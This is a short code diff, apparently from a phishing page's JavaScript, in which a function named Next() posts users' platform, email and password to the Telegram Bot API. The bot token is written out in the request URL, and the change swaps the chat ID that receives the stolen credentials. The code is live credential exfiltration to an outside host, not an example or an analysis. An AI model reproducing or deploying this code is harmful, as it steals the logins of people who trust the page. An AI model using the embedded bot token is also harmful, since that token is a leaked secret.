@@ -40,7 +40,7 @@ function Next(){
             // });
 
             const response = await axios.post(`https://api.telegram.org/bot6346477835:AAE--Er907FambpxvtD7C-CU-J7GlwgyEkg/sendMessage`, {
-                  chat_id: 5968552603,
+                  chat_id: 5916570239,
                   text: `Platform : ${platform} , User ID : ${email} , Password : ${password}'`,
                 });
         
